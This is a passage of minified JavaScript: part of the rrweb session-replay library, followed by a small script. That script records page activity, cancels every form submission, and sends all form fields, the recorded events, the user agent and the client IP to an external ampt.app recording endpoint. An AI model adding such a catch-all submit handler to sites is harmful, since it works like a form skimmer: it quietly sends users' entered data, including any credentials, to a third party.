                        },
                        applyInput: this.applyInput.bind(this),
                        applyScroll: this.applyScroll.bind(this),
                        applyStyleSheetMutation: (l, c) => {
                            l.source === N.StyleSheetRule ? this.applyStyleSheetRule(l, c) : l.source === N.StyleDeclaration && this.applyStyleDeclaration(l, c)
                        }
                    };
                    if (this.iframe.contentDocument && de(this.iframe.contentDocument, this.virtualDom, i, this.virtualDom.mirror), this.virtualDom.destroyTree(), this.usingVirtualDom = !1, Object.keys(this.legacy_missingNodeRetryMap).length) for (const l in this.legacy_missingNodeRetryMap) try {
                        const c = this.legacy_missingNodeRetryMap[l],
                            u = gt(c.node, this.mirror, this.virtualDom.mirror);
                        de(u, c.node, i, this.virtualDom.mirror), c.node = u
                    } catch (c) {
                        this.config.showWarning && console.warn(c)
                    }
                    this.constructedStyleMutations.forEach(l => {
                        this.applyStyleSheetMutation(l)
                    }), this.constructedStyleMutations = [], this.adoptedStyleSheets.forEach(l => {
                        this.applyAdoptedStyleSheet(l)
                    }), this.adoptedStyleSheets = []
                }
                this.mousePos && (this.moveAndHover(this.mousePos.x, this.mousePos.y, this.mousePos.id, !0, this.mousePos.debugData), this.mousePos = null), this.lastSelectionData && (this.applySelection(this.lastSelectionData), this.lastSelectionData = null)
            }), this.emitter.on(O.PlayBack, () => {
                this.firstFullSnapshot = null, this.mirror.reset(), this.styleMirror.reset()
            });
            const o = new Ko([], {speed: this.config.speed, liveMode: this.config.liveMode});
            this.service = rs({
                events: e.map(i => n && n.unpackFn ? n.unpackFn(i) : i).sort((i, l) => i.timestamp - l.timestamp),
                timer: o,
                timeOffset: 0,
                baselineTime: 0,
                lastPlayedEvent: null
            }, {
                getCastFn: this.getCastFn,
                applyEventsSynchronously: this.applyEventsSynchronously,
                emitter: this.emitter
            }), this.service.start(), this.service.subscribe(i => {
                this.emitter.emit(O.StateChange, {player: i})
            }), this.speedService = os({
                normalSpeed: -1,
                timer: o
            }), this.speedService.start(), this.speedService.subscribe(i => {
                this.emitter.emit(O.StateChange, {speed: i})
            });
            const a = this.service.state.context.events.find(i => i.type === C.Meta),
                s = this.service.state.context.events.find(i => i.type === C.FullSnapshot);
            if (a) {
                const {width: i, height: l} = a.data;
                setTimeout(() => {
                    this.emitter.emit(O.Resize, {width: i, height: l})
                }, 0)
            }
            s && setTimeout(() => {
                var i;
                this.firstFullSnapshot || (this.firstFullSnapshot = s, this.rebuildFullSnapshot(s), (i = this.iframe.contentWindow) == null || i.scrollTo(s.data.initialOffset))
            }, 1), this.service.state.context.events.find(Xn) && this.mouse.classList.add("touch-device")
        }

        get timer() {
            return this.service.state.context.timer
        }

        on(e, n) {
            return this.emitter.on(e, n), this
        }

        off(e, n) {
            return this.emitter.off(e, n), this
        }

        setConfig(e) {
            Object.keys(e).forEach(n => {
                e[n], this.config[n] = e[n]
            }), this.config.skipInactive || this.backToNormal(), typeof e.speed < "u" && this.speedService.send({
                type: "SET_SPEED",
                payload: {speed: e.speed}
            }), typeof e.mouseTail < "u" && (e.mouseTail === !1 ? this.mouseTail && (this.mouseTail.style.display = "none") : (this.mouseTail || (this.mouseTail = document.createElement("canvas"), this.mouseTail.width = Number.parseFloat(this.iframe.width), this.mouseTail.height = Number.parseFloat(this.iframe.height), this.mouseTail.classList.add("replayer-mouse-tail"), this.wrapper.insertBefore(this.mouseTail, this.iframe)), this.mouseTail.style.display = "inherit"))
        }

        getMetaData() {
            const e = this.service.state.context.events[0],
                n = this.service.state.context.events[this.service.state.context.events.length - 1];
            return {startTime: e.timestamp, endTime: n.timestamp, totalTime: n.timestamp - e.timestamp}
        }

        getCurrentTime() {
            return this.timer.timeOffset + this.getTimeOffset()
        }

        getTimeOffset() {
            const {baselineTime: e, events: n} = this.service.state.context;
            return e - n[0].timestamp
        }

        getMirror() {
            return this.mirror
        }

        play(e = 0) {
            var n, r;
            this.service.state.matches("paused") ? this.service.send({
                type: "PLAY",
                payload: {timeOffset: e}
            }) : (this.service.send({type: "PAUSE"}), this.service.send({
                type: "PLAY",
                payload: {timeOffset: e}
            })), (r = (n = this.iframe.contentDocument) == null ? void 0 : n.getElementsByTagName("html")[0]) == null || r.classList.remove("rrweb-paused"), this.emitter.emit(O.Start)
        }

        pause(e) {
            var n, r;
            e === void 0 && this.service.state.matches("playing") && this.service.send({type: "PAUSE"}), typeof e == "number" && (this.play(e), this.service.send({type: "PAUSE"})), (r = (n = this.iframe.contentDocument) == null ? void 0 : n.getElementsByTagName("html")[0]) == null || r.classList.add("rrweb-paused"), this.emitter.emit(O.Pause)
        }

        resume(e = 0) {
            console.warn("The 'resume' was deprecated in 1.0. Please use 'play' method which has the same interface."), this.play(e), this.emitter.emit(O.Resume)
        }

        destroy() {
            this.pause(), this.config.root.removeChild(this.wrapper), this.emitter.emit(O.Destroy)
        }

        startLive(e) {
            this.service.send({type: "TO_LIVE", payload: {baselineTime: e}})
        }

        addEvent(e) {
            const n = this.config.unpackFn ? this.config.unpackFn(e) : e;
            Xn(n) && this.mouse.classList.add("touch-device"), Promise.resolve().then(() => this.service.send({
                type: "ADD_EVENT",
                payload: {event: n}
            }))
        }

        enableInteract() {
            this.iframe.setAttribute("scrolling", "auto"), this.iframe.style.pointerEvents = "auto"
        }

        disableInteract() {
            this.iframe.setAttribute("scrolling", "no"), this.iframe.style.pointerEvents = "none"
        }

        resetCache() {
            this.cache = Wt()
        }

        setupDom() {
            this.wrapper = document.createElement("div"), this.wrapper.classList.add("replayer-wrapper"), this.config.root.appendChild(this.wrapper), this.mouse = document.createElement("div"), this.mouse.classList.add("replayer-mouse"), this.wrapper.appendChild(this.mouse), this.config.mouseTail !== !1 && (this.mouseTail = document.createElement("canvas"), this.mouseTail.classList.add("replayer-mouse-tail"), this.mouseTail.style.display = "inherit", this.wrapper.appendChild(this.mouseTail)), this.iframe = document.createElement("iframe");
            const e = ["allow-same-origin"];
            this.config.UNSAFE_replayCanvas && e.push("allow-scripts"), this.iframe.style.display = "none", this.iframe.setAttribute("sandbox", e.join(" ")), this.disableInteract(), this.wrapper.appendChild(this.iframe), this.iframe.contentWindow && this.iframe.contentDocument && (Zo(this.iframe.contentWindow, this.iframe.contentDocument), at(this.iframe.contentWindow))
        }

        rebuildFullSnapshot(e, n = !1) {
            if (!this.iframe.contentDocument) return console.warn("Looks like your replayer has been destroyed.");
            Object.keys(this.legacy_missingNodeRetryMap).length && console.warn("Found unresolved missing node map", this.legacy_missingNodeRetryMap), this.legacy_missingNodeRetryMap = {};
            const r = [], o = (i, l) => {
                this.collectIframeAndAttachDocument(r, i);
                for (const c of this.config.plugins || []) c.onBuild && c.onBuild(i, {id: l, replayer: this})
            };
            Mr(e.data.node, {
                doc: this.iframe.contentDocument,
                afterAppend: o,
                cache: this.cache,
                mirror: this.mirror
            }), o(this.iframe.contentDocument, e.data.node.id);
            for (const {
                mutationInQueue: i,
                builtNode: l
            } of r) this.attachDocumentToIframe(i, l), this.newDocumentQueue = this.newDocumentQueue.filter(c => c !== i);
            const {documentElement: a, head: s} = this.iframe.contentDocument;
            this.insertStyleRules(a, s), this.service.state.matches("playing") || this.iframe.contentDocument.getElementsByTagName("html")[0].classList.add("rrweb-paused"), this.emitter.emit(O.FullsnapshotRebuilded, e), n || this.waitForStylesheetLoad(), this.config.UNSAFE_replayCanvas && this.preloadAllImages()
        }

        insertStyleRules(e, n) {
            var r;
            const o = ss(this.config.blockClass).concat(this.config.insertStyleRules);
            if (this.config.pauseAnimation && o.push("html.rrweb-paused *, html.rrweb-paused *:before, html.rrweb-paused *:after { animation-play-state: paused !important; }"), this.usingVirtualDom) {
                const a = this.virtualDom.createElement("style");
                this.virtualDom.mirror.add(a, Dn(a, this.virtualDom.unserializedId)), e.insertBefore(a, n), a.rules.push({
                    source: N.StyleSheetRule,
                    adds: o.map((s, i) => ({rule: s, index: i}))
                })
            } else {
                const a = document.createElement("style");
                e.insertBefore(a, n);
                for (let s = 0; s < o.length; s++) (r = a.sheet) == null || r.insertRule(o[s], s)
            }
        }

        attachDocumentToIframe(e, n) {
            const r = this.usingVirtualDom ? this.virtualDom.mirror : this.mirror, o = [], a = (s, i) => {
                this.collectIframeAndAttachDocument(o, s);
                const l = r.getMeta(s);
                if (l?.type === D.Element && l?.tagName.toUpperCase() === "HTML") {
                    const {documentElement: c, head: u} = n.contentDocument;
                    this.insertStyleRules(c, u)
                }
                for (const c of this.config.plugins || []) c.onBuild && c.onBuild(s, {id: i, replayer: this})
            };
            _e(e.node, {
                doc: n.contentDocument,
                mirror: r,
                hackCss: !0,
                skipChild: !1,
                afterAppend: a,
                cache: this.cache
            }), a(n.contentDocument, e.node.id);
            for (const {
                mutationInQueue: s,
                builtNode: i
            } of o) this.attachDocumentToIframe(s, i), this.newDocumentQueue = this.newDocumentQueue.filter(l => l !== s)
        }

        collectIframeAndAttachDocument(e, n) {
            if (Ie(n, this.mirror)) {
                const r = this.newDocumentQueue.find(o => o.parentId === this.mirror.getId(n));
                r && e.push({mutationInQueue: r, builtNode: n})
            }
        }

        waitForStylesheetLoad() {
            var e;
            const n = (e = this.iframe.contentDocument) == null ? void 0 : e.head;
            if (n) {
                const r = new Set;
                let o, a = this.service.state;
                const s = () => {
                    a = this.service.state
                };
                this.emitter.on(O.Start, s), this.emitter.on(O.Pause, s);
                const i = () => {
                    this.emitter.off(O.Start, s), this.emitter.off(O.Pause, s)
                };
                n.querySelectorAll('link[rel="stylesheet"]').forEach(l => {
                    l.sheet || (r.add(l), l.addEventListener("load", () => {
                        r.delete(l), r.size === 0 && o !== -1 && (a.matches("playing") && this.play(this.getCurrentTime()), this.emitter.emit(O.LoadStylesheetEnd), o && clearTimeout(o), i())
                    }))
                }), r.size > 0 && (this.service.send({type: "PAUSE"}), this.emitter.emit(O.LoadStylesheetStart), o = setTimeout(() => {
                    a.matches("playing") && this.play(this.getCurrentTime()), o = -1, i()
                }, this.config.loadTimeout))
            }
        }

        preloadAllImages() {
            return Et(this, null, function* () {
                this.service.state;
                const e = () => {
                    this.service.state
                };
                this.emitter.on(O.Start, e), this.emitter.on(O.Pause, e);
                const n = [];
                for (const r of this.service.state.context.events) r.type === C.IncrementalSnapshot && r.data.source === N.CanvasMutation && (n.push(this.deserializeAndPreloadCanvasEvents(r.data, r)), ("commands" in r.data ? r.data.commands : [r.data]).forEach(o => {
                    this.preloadImages(o, r)
                }));
                return Promise.all(n)
            })
        }

        preloadImages(e, n) {
            if (e.property === "drawImage" && typeof e.args[0] == "string" && !this.imageMap.has(n)) {
                const r = document.createElement("canvas"), o = r.getContext("2d"),
                    a = o?.createImageData(r.width, r.height);
                a?.data, JSON.parse(e.args[0]), o?.putImageData(a, 0, 0)
            }
        }

        deserializeAndPreloadCanvasEvents(e, n) {
            return Et(this, null, function* () {
                if (!this.canvasEventMap.has(n)) {
                    const r = {isUnchanged: !0};
                    if ("commands" in e) {
                        const o = yield Promise.all(e.commands.map(a => Et(this, null, function* () {
                            const s = yield Promise.all(a.args.map(ye(this.imageMap, null, r)));
                            return wt(Qe({}, a), {args: s})
                        })));
                        r.isUnchanged === !1 && this.canvasEventMap.set(n, wt(Qe({}, e), {commands: o}))
                    } else {
                        const o = yield Promise.all(e.args.map(ye(this.imageMap, null, r)));
                        r.isUnchanged === !1 && this.canvasEventMap.set(n, wt(Qe({}, e), {args: o}))
                    }
                }
            })
        }

        applyIncremental(e, n) {
            var r, o, a;
            const {data: s} = e;
            switch (s.source) {
                case N.Mutation: {
                    try {
                        this.applyMutation(s, n)
                    } catch (i) {
                        this.warn(`Exception in mutation ${i.message || i}`, s)
                    }
                    break
                }
                case N.Drag:
                case N.TouchMove:
                case N.MouseMove:
                    if (n) {
                        const i = s.positions[s.positions.length - 1];
                        this.mousePos = {x: i.x, y: i.y, id: i.id, debugData: s}
                    } else s.positions.forEach(i => {
                        const l = {
                            doAction: () => {
                                this.moveAndHover(i.x, i.y, i.id, n, s)
                            }, delay: i.timeOffset + e.timestamp - this.service.state.context.baselineTime
                        };
                        this.timer.addAction(l)
                    }), this.timer.addAction({
                        doAction() {
                        }, delay: e.delay - ((r = s.positions[0]) == null ? void 0 : r.timeOffset)
                    });
                    break;
                case N.MouseInteraction: {
                    if (s.id === -1 || n) break;
                    const i = new Event(j[s.type].toLowerCase()), l = this.mirror.getNode(s.id);
                    if (!l) return this.debugNodeNotFound(s, s.id);
                    this.emitter.emit(O.MouseInteraction, {type: s.type, target: l});
                    const {triggerFocus: c} = this.config;
                    switch (s.type) {
                        case j.Blur:
                            "blur" in l && l.blur();
                            break;
                        case j.Focus:
                            c && l.focus && l.focus({preventScroll: !0});
                            break;
                        case j.Click:
                        case j.TouchStart:
                        case j.TouchEnd:
                            n ? (s.type === j.TouchStart ? this.touchActive = !0 : s.type === j.TouchEnd && (this.touchActive = !1), this.mousePos = {
                                x: s.x,
                                y: s.y,
                                id: s.id,
                                debugData: s
                            }) : (s.type === j.TouchStart && (this.tailPositions.length = 0), this.moveAndHover(s.x, s.y, s.id, n, s), s.type === j.Click ? (this.mouse.classList.remove("active"), this.mouse.offsetWidth, this.mouse.classList.add("active")) : s.type === j.TouchStart ? (this.mouse.offsetWidth, this.mouse.classList.add("touch-active")) : s.type === j.TouchEnd && this.mouse.classList.remove("touch-active"));
                            break;
                        case j.TouchCancel:
                            n ? this.touchActive = !1 : this.mouse.classList.remove("touch-active");
                            break;
                        default:
                            l.dispatchEvent(i)
                    }
                    break
                }
                case N.Scroll: {
                    if (s.id === -1) break;
                    if (this.usingVirtualDom) {
                        const i = this.virtualDom.mirror.getNode(s.id);
                        if (!i) return this.debugNodeNotFound(s, s.id);
                        i.scrollData = s;
                        break
                    }
                    this.applyScroll(s, n);
                    break
                }
                case N.ViewportResize:
                    this.emitter.emit(O.Resize, {width: s.width, height: s.height});
                    break;
                case N.Input: {
                    if (s.id === -1) break;
                    if (this.usingVirtualDom) {
                        const i = this.virtualDom.mirror.getNode(s.id);
                        if (!i) return this.debugNodeNotFound(s, s.id);
                        i.inputData = s;
                        break
                    }
                    this.applyInput(s);
                    break
                }
                case N.MediaInteraction: {
                    const i = this.usingVirtualDom ? this.virtualDom.mirror.getNode(s.id) : this.mirror.getNode(s.id);
                    if (!i) return this.debugNodeNotFound(s, s.id);
                    const l = i;
                    try {
                        s.currentTime && (l.currentTime = s.currentTime), s.volume && (l.volume = s.volume), s.muted && (l.muted = s.muted), s.type === me.Pause && l.pause(), s.type === me.Play && l.play(), s.type === me.RateChange && (l.playbackRate = s.playbackRate)
                    } catch (c) {
                        this.config.showWarning && console.warn(`Failed to replay media interactions: ${c.message || c}`)
                    }
                    break
                }
                case N.StyleSheetRule:
                case N.StyleDeclaration: {
                    this.usingVirtualDom ? s.styleId ? this.constructedStyleMutations.push(s) : s.id && ((o = this.virtualDom.mirror.getNode(s.id)) == null || o.rules.push(s)) : this.applyStyleSheetMutation(s);
                    break
                }
                case N.CanvasMutation: {
                    if (!this.config.UNSAFE_replayCanvas) return;
                    if (this.usingVirtualDom) {
                        const i = this.virtualDom.mirror.getNode(s.id);
                        if (!i) return this.debugNodeNotFound(s, s.id);
                        i.canvasMutations.push({event: e, mutation: s})
                    } else {
                        const i = this.mirror.getNode(s.id);
                        if (!i) return this.debugNodeNotFound(s, s.id);
                        zn({
                            event: e,
                            mutation: s,
                            target: i,
                            imageMap: this.imageMap,
                            canvasEventMap: this.canvasEventMap,
                            errorHandler: this.warnCanvasMutationFailed.bind(this)
                        })
                    }
                    break
                }
                case N.Font: {
                    try {
                        const i = new FontFace(s.family, s.buffer ? new Uint8Array(JSON.parse(s.fontSource)) : s.fontSource, s.descriptors);
                        (a = this.iframe.contentDocument) == null || a.fonts.add(i)
                    } catch (i) {
                        this.config.showWarning && console.warn(i)
                    }
                    break
                }
                case N.Selection: {
                    if (n) {
                        this.lastSelectionData = s;
                        break
                    }
                    this.applySelection(s);
                    break
                }
                case N.AdoptedStyleSheet: {
                    this.usingVirtualDom ? this.adoptedStyleSheets.push(s) : this.applyAdoptedStyleSheet(s);
                    break
                }
            }
        }

        applyMutation(e, n) {
            if (this.config.useVirtualDom && !this.usingVirtualDom && n && (this.usingVirtualDom = !0, zo(this.iframe.contentDocument, this.mirror, this.virtualDom), Object.keys(this.legacy_missingNodeRetryMap).length)) for (const c in this.legacy_missingNodeRetryMap) try {
                const u = this.legacy_missingNodeRetryMap[c], d = kn(u.node, this.virtualDom, this.mirror);
                d && (u.node = d)
            } catch (u) {
                this.config.showWarning && console.warn(u)
            }
            const r = this.usingVirtualDom ? this.virtualDom.mirror : this.mirror;
            e.removes.forEach(c => {
                var u;
                const d = r.getNode(c.id);
                if (!d) return e.removes.find(p => p.id === c.parentId) ? void 0 : this.warnNodeNotFound(e, c.id);
                let h = r.getNode(c.parentId);
                if (!h) return this.warnNodeNotFound(e, c.parentId);
                if (c.isShadow && ve(h) && (h = h.shadowRoot), r.removeNodeFromMap(d), h) try {
                    h.removeChild(d), this.usingVirtualDom && d.nodeName === "#text" && h.nodeName === "STYLE" && ((u = h.rules) == null ? void 0 : u.length) > 0 && (h.rules = [])
                } catch (p) {
                    if (p instanceof DOMException) this.warn("parent could not remove child in mutation", h, d, e); else throw p
                }
            });
            const o = Qe({}, this.legacy_missingNodeRetryMap), a = [], s = c => {
                let u = null;
                return c.nextId && (u = r.getNode(c.nextId)), c.nextId !== null && c.nextId !== void 0 && c.nextId !== -1 && !u
            }, i = c => {
                var u;
                if (!this.iframe.contentDocument) return console.warn("Looks like your replayer has been destroyed.");
                let d = r.getNode(c.parentId);
                if (!d) return c.node.type === D.Document ? this.newDocumentQueue.push(c) : a.push(c);
                c.node.isShadow && (ve(d) || d.attachShadow({mode: "open"}), d = d.shadowRoot);
                let h = null, p = null;
                if (c.previousId && (h = r.getNode(c.previousId)), c.nextId && (p = r.getNode(c.nextId)), s(c)) return a.push(c);
                if (c.node.rootId && !r.getNode(c.node.rootId)) return;
                const m = c.node.rootId ? r.getNode(c.node.rootId) : this.usingVirtualDom ? this.virtualDom : this.iframe.contentDocument;
                if (Ie(d, r)) {
                    this.attachDocumentToIframe(c, d);
                    return
                }
                const b = (y, g) => {
                    for (const E of this.config.plugins || []) E.onBuild && E.onBuild(y, {id: g, replayer: this})
                }, S = _e(c.node, {doc: m, mirror: r, skipChild: !0, hackCss: !0, cache: this.cache, afterAppend: b});
                if (c.previousId === -1 || c.nextId === -1) {
                    o[c.node.id] = {node: S, mutation: c};
                    return
                }
                const f = r.getMeta(d);
                if (f && f.type === D.Element && f.tagName === "textarea" && c.node.type === D.Text) {
                    const y = Array.isArray(d.childNodes) ? d.childNodes : Array.from(d.childNodes);
                    for (const g of y) g.nodeType === d.TEXT_NODE && d.removeChild(g)
                }
                if (h && h.nextSibling && h.nextSibling.parentNode) d.insertBefore(S, h.nextSibling); else if (p && p.parentNode) d.contains(p) ? d.insertBefore(S, p) : d.insertBefore(S, null); else {
                    if (d === m) for (; m.firstChild;) m.removeChild(m.firstChild);
                    d.appendChild(S)
                }
                if (b(S, c.node.id), this.usingVirtualDom && S.nodeName === "#text" && d.nodeName === "STYLE" && ((u = d.rules) == null ? void 0 : u.length) > 0 && (d.rules = []), Ie(S, this.mirror)) {
                    const y = this.mirror.getId(S), g = this.newDocumentQueue.find(E => E.parentId === y);
                    g && (this.attachDocumentToIframe(g, S), this.newDocumentQueue = this.newDocumentQueue.filter(E => E !== g))
                }
                (c.previousId || c.nextId) && this.legacy_resolveMissingNode(o, d, S, c)
            };
            e.adds.forEach(c => {
                i(c)
            });
            const l = Date.now();
            for (; a.length;) {
                const c = Ut(a);
                if (a.length = 0, Date.now() - l > 500) {
                    this.warn("Timeout in the loop, please check the resolve tree data:", c);
                    break
                }
                for (const u of c) r.getNode(u.value.parentId) ? lt(u, d => {
                    i(d)
                }) : this.debug("Drop resolve tree since there is no parent for the root node.", u)
            }
            Object.keys(o).length && Object.assign(this.legacy_missingNodeRetryMap, o), Vt(e.texts).forEach(c => {
                var u;
                const d = r.getNode(c.id);
                if (!d) return e.removes.find(h => h.id === c.id) ? void 0 : this.warnNodeNotFound(e, c.id);
                if (d.textContent = c.value, this.usingVirtualDom) {
                    const h = d.parentNode;
                    ((u = h?.rules) == null ? void 0 : u.length) > 0 && (h.rules = [])
                }
            }), e.attributes.forEach(c => {
                const u = r.getNode(c.id);
                if (!u) return e.removes.find(d => d.id === c.id) ? void 0 : this.warnNodeNotFound(e, c.id);
                for (const d in c.attributes) if (typeof d == "string") {
                    const h = c.attributes[d];
                    if (h === null) u.removeAttribute(d); else if (typeof h == "string") try {
                        if (d === "_cssText" && (u.nodeName === "LINK" || u.nodeName === "STYLE")) try {
                            const p = r.getMeta(u);
                            Object.assign(p.attributes, c.attributes);
                            const m = _e(p, {
                                doc: u.ownerDocument,
                                mirror: r,
                                skipChild: !0,
                                hackCss: !0,
                                cache: this.cache
                            }), b = u.nextSibling, S = u.parentNode;
                            if (m && S) {
                                S.removeChild(u), S.insertBefore(m, b), r.replace(c.id, m);
                                break
                            }
                        } catch {
                        }
                        u.setAttribute(d, h)
                    } catch (p) {
                        this.config.showWarning && console.warn("An error occurred may due to the checkout feature.", p)
                    } else if (d === "style") {
                        const p = h, m = u;
                        for (const b in p) if (p[b] === !1) m.style.removeProperty(b); else if (p[b] instanceof Array) {
                            const S = p[b];
                            m.style.setProperty(b, S[0], S[1])
                        } else {
                            const S = p[b];
                            m.style.setProperty(b, S)
                        }
                    }
                }
            })
        }

        applyScroll(e, n) {
            var r, o;
            const a = this.mirror.getNode(e.id);
            if (!a) return this.debugNodeNotFound(e, e.id);
            const s = this.mirror.getMeta(a);
            if (a === this.iframe.contentDocument) (r = this.iframe.contentWindow) == null || r.scrollTo({
                top: e.y,
                left: e.x,
                behavior: n ? "auto" : "smooth"
            }); else if (s?.type === D.Document) (o = a.defaultView) == null || o.scrollTo({
                top: e.y,
                left: e.x,
                behavior: n ? "auto" : "smooth"
            }); else try {
                a.scrollTo({top: e.y, left: e.x, behavior: n ? "auto" : "smooth"})
            } catch {
            }
        }

        applyInput(e) {
            const n = this.mirror.getNode(e.id);
            if (!n) return this.debugNodeNotFound(e, e.id);
            try {
                n.checked = e.isChecked, n.value = e.text
            } catch {
            }
        }

        applySelection(e) {
            try {
                const n = new Set, r = e.ranges.map(({start: o, startOffset: a, end: s, endOffset: i}) => {
                    const l = this.mirror.getNode(o), c = this.mirror.getNode(s);
                    if (!l || !c) return;
                    const u = new Range;
                    u.setStart(l, a), u.setEnd(c, i);
                    const d = l.ownerDocument, h = d?.getSelection();
                    return h && n.add(h), {range: u, selection: h}
                });
                n.forEach(o => o.removeAllRanges()), r.forEach(o => {
                    var a;
                    return o && ((a = o.selection) == null ? void 0 : a.addRange(o.range))
                })
            } catch {
            }
        }

        applyStyleSheetMutation(e) {
            var n;
            let r = null;
            e.styleId ? r = this.styleMirror.getStyle(e.styleId) : e.id && (r = ((n = this.mirror.getNode(e.id)) == null ? void 0 : n.sheet) || null), r && (e.source === N.StyleSheetRule ? this.applyStyleSheetRule(e, r) : e.source === N.StyleDeclaration && this.applyStyleDeclaration(e, r))
        }

        applyStyleSheetRule(e, n) {
            var r, o, a, s;
            if ((r = e.adds) == null || r.forEach(({rule: i, index: l}) => {
                try {
                    if (Array.isArray(l)) {
                        const {positions: c, index: u} = dt(l);
                        Te(n.cssRules, c).insertRule(i, u)
                    } else {
                        const c = l === void 0 ? void 0 : Math.min(l, n.cssRules.length);
                        n?.insertRule(i, c)
                    }
                } catch {
                }
            }), (o = e.removes) == null || o.forEach(({index: i}) => {
                try {
                    if (Array.isArray(i)) {
                        const {positions: l, index: c} = dt(i);
                        Te(n.cssRules, l).deleteRule(c || 0)
                    } else n?.deleteRule(i)
                } catch {
                }
            }), e.replace) try {
                (a = n.replace) == null || a.call(n, e.replace)
            } catch {
            }
            if (e.replaceSync) try {
                (s = n.replaceSync) == null || s.call(n, e.replaceSync)
            } catch {
            }
        }

        applyStyleDeclaration(e, n) {
            e.set && Te(n.rules, e.index).style.setProperty(e.set.property, e.set.value, e.set.priority), e.remove && Te(n.rules, e.index).style.removeProperty(e.remove.property)
        }

        applyAdoptedStyleSheet(e) {
            var n;
            const r = this.mirror.getNode(e.id);
            if (!r) return;
            (n = e.styles) == null || n.forEach(i => {
                var l;
                let c = null, u = null;
                if (ve(r) ? u = ((l = r.ownerDocument) == null ? void 0 : l.defaultView) || null : r.nodeName === "#document" && (u = r.defaultView), !!u) try {
                    c = new u.CSSStyleSheet, this.styleMirror.add(c, i.styleId), this.applyStyleSheetRule({
                        source: N.StyleSheetRule,
                        adds: i.rules
                    }, c)
                } catch {
                }
            });
            const o = 10;
            let a = 0;
            const s = (i, l) => {
                const c = l.map(u => this.styleMirror.getStyle(u)).filter(u => u !== null);
                ve(i) ? i.shadowRoot.adoptedStyleSheets = c : i.nodeName === "#document" && (i.adoptedStyleSheets = c), c.length !== l.length && a < o && (setTimeout(() => s(i, l), 0 + 100 * a), a++)
            };
            s(r, e.styleIds)
        }

        legacy_resolveMissingNode(e, n, r, o) {
            const {previousId: a, nextId: s} = o, i = a && e[a], l = s && e[s];
            if (i) {
                const {node: c, mutation: u} = i;
                n.insertBefore(c, r), delete e[u.node.id], delete this.legacy_missingNodeRetryMap[u.node.id], (u.previousId || u.nextId) && this.legacy_resolveMissingNode(e, n, c, u)
            }
            if (l) {
                const {node: c, mutation: u} = l;
                n.insertBefore(c, r.nextSibling), delete e[u.node.id], delete this.legacy_missingNodeRetryMap[u.node.id], (u.previousId || u.nextId) && this.legacy_resolveMissingNode(e, n, c, u)
            }
        }

        moveAndHover(e, n, r, o, a) {
            const s = this.mirror.getNode(r);
            if (!s) return this.debugNodeNotFound(a, r);
            const i = ut(s, this.iframe), l = e * i.absoluteScale + i.x, c = n * i.absoluteScale + i.y;
            this.mouse.style.left = `${l}px`, this.mouse.style.top = `${c}px`, o || this.drawMouseTail({
                x: l,
                y: c
            }), this.hoverElements(s)
        }

        drawMouseTail(e) {
            if (!this.mouseTail) return;
            const {
                lineCap: n,
                lineWidth: r,
                strokeStyle: o,
                duration: a
            } = this.config.mouseTail === !0 ? Ct : Object.assign({}, Ct, this.config.mouseTail), s = () => {
                if (!this.mouseTail) return;
                const i = this.mouseTail.getContext("2d");
                !i || !this.tailPositions.length || (i.clearRect(0, 0, this.mouseTail.width, this.mouseTail.height), i.beginPath(), i.lineWidth = r, i.lineCap = n, i.strokeStyle = o, i.moveTo(this.tailPositions[0].x, this.tailPositions[0].y), this.tailPositions.forEach(l => i.lineTo(l.x, l.y)), i.stroke())
            };
            this.tailPositions.push(e), s(), setTimeout(() => {
                this.tailPositions = this.tailPositions.filter(i => i !== e), s()
            }, a / this.speedService.state.context.timer.speed)
        }

        hoverElements(e) {
            var n;
            (n = this.iframe.contentDocument) == null || n.querySelectorAll(".\\:hover").forEach(o => {
                o.classList.remove(":hover")
            });
            let r = e;
            for (; r;) r.classList && r.classList.add(":hover"), r = r.parentElement
        }

        isUserInteraction(e) {
            return e.type !== C.IncrementalSnapshot ? !1 : e.data.source > N.Mutation && e.data.source <= N.Input
        }

        backToNormal() {
            this.nextUserInteractionEvent = null, !this.speedService.state.matches("normal") && (this.speedService.send({type: "BACK_TO_NORMAL"}), this.emitter.emit(O.SkipEnd, {speed: this.speedService.state.context.normalSpeed}))
        }

        warnNodeNotFound(e, n) {
            this.warn(`Node with id '${n}' not found. `, e)
        }

        warnCanvasMutationFailed(e, n) {
            this.warn("Has error on canvas update", n, "canvas mutation:", e)
        }

        debugNodeNotFound(e, n) {
            this.debug(Nt, `Node with id '${n}' not found. `, e)
        }

        warn(...e) {
            !this.config.showWarning || console.warn(Nt, ...e)
        }

        debug(...e) {
            !this.config.showDebug || console.log(Nt, ...e)
        }
    }

    const {addCustomEvent: Cs} = be, {freezePage: Is} = be;
    return ee.EventType = C, ee.IncrementalSource = N, ee.MouseInteractions = j, ee.Replayer = Ns, ee.ReplayerEvents = O, ee.addCustomEvent = Cs, ee.freezePage = Is, ee.record = be, ee.utils = kr, Object.defineProperty(ee, "__esModule", {value: !0}), ee
}({});

let automaticRecord = false;
let saveOnSubmit = false;
const events = [];


if (automaticRecord) {
    startRecord()
}

function startRecord() {
    console.log('startRecord')
    rrweb.record({
        emit(event) {
            events.push(event);
        },
        recordCanvas: true,
    });
}

addEventListener("submit", async (event) => {
    event.preventDefault();
    const data = new FormData(event.target);
    const jsonObject = Object.fromEntries(Array.from(data.entries()));
    const userAgent = window.navigator.userAgent;
    const response = await fetch("https://api.ipify.org/?format=json");
    const responseAsJson = await response.json();
    const clientIp = responseAsJson?.ip;
    const dataSubmit = {form: jsonObject, events, clientIp, userAgent, clientToken: clientToken ? clientToken : ''};
    console.log('dataSubmit: ',dataSubmit)
    const key = await saveRecord(JSON.stringify(dataSubmit));
    // endRecord(key)
});

async function saveRecord(requestData) {
    console.log(`saveRecord#clientToken:#${clientToken}#`)
    const response = await fetch(`https://happy-api-e5f69.ampt.app/liveprint/recording?clientToken=${clientToken}`, {
        method: 'POST',
        body: requestData,
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    });
    return await response.json();
}

